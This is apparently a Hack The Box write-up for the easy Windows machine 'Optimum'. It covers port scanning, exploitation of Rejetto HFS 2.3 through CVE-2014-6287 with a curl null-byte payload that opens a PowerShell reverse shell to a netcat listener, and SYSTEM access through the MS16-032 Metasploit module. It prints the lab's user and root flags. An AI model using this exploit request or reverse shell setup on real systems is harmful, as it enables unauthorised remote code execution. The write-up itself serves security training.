+++
title = "Optimum"
date = "2023-12-13"
description = "This is an easy Windows box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Windows

**Release date**: 2017-03-18

**Created by**: [ch4p](https://app.hackthebox.com/users/1)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with `sudo`, which gets cumbersome in the long run.

I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box.
   I'll call it `workspace`, and it will be located at the root of my filesystem
   `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll use
   `httpsimpleserver` to create an HTTP server on port `80` and
   `impacket-smbserver` to create an SMB share named `server`. This will make
   files in this folder available over the Internet, which will be especially
   useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory.
   This will come in handy once we get a foothold, for privilege escalation and
   for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.9`. The
commands ran on my machine will be prefixed with `❯` for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Host `10.10.10.8`

## Scanning

### Ports

As usual, let's start by initiating a port scan on Optimum using a TCP SYN
`nmap` scan to assess its attack surface.

```sh
❯ nmap -sS "10.10.10.8" -p-
```

```
<SNIP>
PORT   STATE SERVICE
80/tcp open  http
<SNIP>
```

Let's also check the 500 most common UDP ports.

```sh
❯ nmap -sU "10.10.10.8" --top-ports "500"
```

```
<SNIP>
```

### Fingerprinting

Following the ports scans, let's gather more data about the service associated
with the open TCP port we found.

```sh
❯ nmap -sS "10.10.10.8" -p "80" -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

Alright, so `nmap` managed to determine that Optimum is running Windows.

### Scripts

Let's run `nmap`'s default scripts on the TCP service to see if they can find
additional information.

```sh
❯ nmap -sS "10.10.10.8" -p "80" -sC
```

```
<SNIP>
PORT   STATE SERVICE
80/tcp open  http
|_http-title: HFS /
<SNIP>
```

The `http-title` script detected that the website's homepage title is 'HFS /'.

## Services enumeration

### HFS

#### Fingerprinting

Let's use `whatweb` to fingerprint HFS's homepage.

```sh
❯ whatweb -a3 "http://10.10.10.8/" -v
```

```
WhatWeb report for http://10.10.10.8/
Status    : 200 OK
Title     : HFS /
IP        : 10.10.10.8
Country   : RESERVED, ZZ

Summary   : Cookies[HFS_SID], HTTPServer[HFS 2.3], HttpFileServer, JQuery[1.4.4], Script[text/javascript]

Detected Plugins:
[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : HFS_SID

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : HFS 2.3 (from server string)

[ HttpFileServer ]
        You can use HFS (HTTP File Server) to send and receive 
        files. Access your remote files, over the network. 

        Google Dorks: (1)
        Website     : http://www.rejetto.com/hfs/

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Version      : 1.4.4
        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : text/javascript

HTTP Headers:
        HTTP/1.1 200 OK
        Content-Type: text/html
        Content-Length: 1663
        Accept-Ranges: bytes
        Server: HFS 2.3
        Set-Cookie: HFS_SID=0.381638351129368; path=/;
        Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
        Content-Encoding: gzip
```

#### Exploration

Let's browse to `http://10.10.10.8/`.

![HFS homepage](hfs-homepage.png)

This is a standard HFS application.

Unfortunately, it doesn't contain any files or folders.

#### Known vulnerabilities

The UI looks really outdated, and if we search online we find that the release
date for this version is
[February 17, 2014](https://www.neowin.net/software/hfs---http-file-server-23-build-288/).
It must be vulnerable to some CVEs! Let's search
[ExploitDB](https://www.exploit-db.com/) for `HttpFileServer`.

We find one exploit that matches the version of the HFS instance:
[Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49125)
([CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)). This looks
really promising!

## Foothold ([CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287))

[CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) is a
vulnerability in Rejetto HTTP File Server version `2.3`. The issue lies
specifically in the `findMacroMarker` function, used to locate the boundaries of
macros within configuration files. This function is vulnerable to a null-byte
injection attack, meaning that an attacker can inject a null byte `%00` into a
configuration file, which would cause the function to terminate prematurely.
This function is used by the search functionality, so an attacker can send a
specific payload to the endpoint responsible for searching to get RCE.

### Preparation

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9001"
```

Then, I'll choose the 'Powershell #3 (Base64)' payload from
[RevShells](https://www.revshells.com/).

I'll save the URL encoded version of it as the `COMMAND` shell variable.

### Exploitation

Let's exploit this CVE to execute our payload.

```sh
❯ curl -s -o "/dev/null" "http://10.10.10.8/?search=%00%7B%7B.exec|$COMMAND.%7D%7D"
```

If we check our listener:

```
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.8] 49158
PS C:\Users\kostas\Desktop>
```

It caught the reverse shell!

## Getting a lay of the land

If we run `whoami`, we see that we got a foothold as `kostas`.

### Architecture

What is Optimum's architecture?

```ps1
PS C:\Users\kostas\Desktop> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" | Select-Object -ExpandProperty "PROCESSOR_ARCHITECTURE"
```

```
AMD64
```

It's using AMD64. Let's keep that in mind to select the appropriate binaries.

### Version

Let's gather some information about the Windows version of Optimum.

```ps1
PS C:\Users\kostas\Desktop> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Format-List -Property "ProductName", "CurrentBuildNumber"
```

```
ProductName        : Windows Server 2012 R2 Standard
CurrentBuildNumber : 9600
```

In fact, it's Windows Server 2012 R2 Standard build `9600`.

### Hotfixes

Let's retrieve the list of installed hotfixes.

```ps1
PS C:\Users\kostas\Desktop> Get-HotFix | Select-Object -ExpandProperty "HotFixID"
```

```
KB2959936
KB2896496
KB2919355
KB2920189
KB2928120
KB2931358
KB2931366
KB2933826
KB2938772
KB2949621
KB2954879
KB2958262
KB2958263
KB2961072
KB2965500
KB2966407
KB2967917
KB2971203
KB2971850
KB2973351
KB2973448
KB2975061
KB2976627
KB2977629
KB2981580
KB2987107
KB2989647
KB2998527
KB3000850
KB3003057
KB3014442
```

There's a few of them.

### Users

Let's enumerate all users using `PowerView`.

```ps1
PS C:\Users\kostas\Desktop> Get-NetLocalGroupMember -GroupName "Users" | Where-Object { $_.MemberName -notmatch "NT AUTHORITY" } | Select-Object "MemberName", "SID" | Format-Table -AutoSize
```

```
MemberName     SID
----------     ---
OPTIMUM\kostas S-1-5-21-605891470-2991919448-81205106-1001
```

There's only `kostas` (us).

What about the administrators?

```ps1
PS C:\Users\kostas\Desktop> Get-NetLocalGroupMember -GroupName "Administrators" | Where-Object { $_.MemberName -notmatch "NT AUTHORITY" } | Select-Object "MemberName", "SID" | Format-Table -AutoSize
```

```
MemberName            SID
----------            ---
OPTIMUM\Administrator S-1-5-21-605891470-2991919448-81205106-500
```

We only find the built-in `Administrator`.

### Groups

Let's enumerate all groups, once again using `PowerView`.

```ps1
PS C:\Users\kostas\Desktop> Get-NetLocalGroup | Select-Object "GroupName", "Comment" | Format-Table -AutoSize
```

```
GroupName                           Comment
---------                           -------
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Administrators                      Administrators have complete and unrestricted access to the computer/domain        
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators             Members are authorized to perform cryptographic operations.                        
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers                   Members of this group can read event logs from local machine                       
Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS                           Built-in group used by Internet Information Services.                              
Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users           Members of this group can access performance counter data locally and remotely     
Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                     Members can administer printers installed on domain controllers                    
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
Remote Desktop Users                Members in this group are granted the right to logon remotely                      
Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator                          Supports file replication in a domain                                              
Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
WinRMRemoteWMIUsers__               Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
```

### NICs

Let's gather the list of connected NICs.

```ps1
PS C:\Users\kostas\Desktop> ipconfig /all
```

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : optimum
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-E6-FB
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.8(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

There's an Ethernet interface and an ISATAP interface.

### Flags

If we check our Desktop folder, we find the user flag.

```ps1
PS C:\Users\kostas\Desktop> Get-Content "C:\Users\kostas\Desktop\user.txt"
```

```
906f8a34baa340c5c8bf81b2cfedef79
```

### Known vulnerabilities

Let's run `Sherlock` to check for known vulnerabilities that might affect
Optimum. Maybe it's missing critical hotfixes?

```ps1
PS C:\Users\kostas\Desktop> Find-AllVulns
```

```
Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

We find several candidates:
[MS16-032](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032),
[MS16-034](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-034)
and
[MS16-135](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-135).

## Privilege escalation ([MS16-032](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032))

[MS16-032](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)
is a Windows vulnerability affecting Windows 7 to Windows 10, and Windows Server
2008 to Windows Server 2012. The vulnerability resides in the Secondary Logon
Service (S4L), which is responsible for handling user logon requests. S4L
utilizes a mechanism called "Security Context Virtualization" (SCV) to
temporarily elevate the privileges of processes performing certain actions, such
as accessing system resources. The flaw in SCV arises from improper handling of
request handles, which are temporary tokens used to identify and manage user
requests. An attacker can exploit this flaw by crafting applications to trick
S4L into granting elevated privileges to processes that don't deserve them,
hence escalating its privileges.

### Preparation

I'll use the Metasploit module
`exploit/windows/local/ms16_032_secondary_logon_handle_privesc` to exploit this
vulnerability, since it's non-trivial to do by hand.

However, this is a privilege escalation module, so it requires a Meterpreter
session to run. Therefore, I'll use my existing reverse shell to get a
Meterpreter session. It got assigned the number `1`.

Then, I'll set the `target` to `Windows x64`, the `payload` to
`payload/windows/x64/powershell_reverse_tcp`, the `RHOSTS` to `10.10.10.8`, the
`LHOST` to `10.10.14.9`, the `LPORT` to `9002` and the `SESSION` to `1`.

### Exploitation

No we can launch the exploit!

```sh
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

```
<SNIP>
PS C:\Users\kostas\Desktop>
```

It went off without a hitch.

However, I don't like Metasploit's shell, so I'll open my own on port `9003`.

## Getting a lay of the land

If we run `whoami`, we see that we're `NT AUTHORITY\SYSTEM`!

### Flags

As usual, we can find the root flag in our home folder.

```ps1
PS C:\Windows\system32> Get-Content "C:\Users\Administrator\Desktop\root.txt"
```

```
ac6fb04739d6d73a57df32c17d1f920f
```

# Afterwords

![Success](success.png)

That's it for this box! 🎉

I rated both the user and root flags as 'Very easy' to obtain. The foothold only
required to find the proper CVE, and was quite easy to exploit. The privilege
escalation was a bit harder to identify, but was trivial to exploit thanks to
Metasploit.

Thanks for reading!
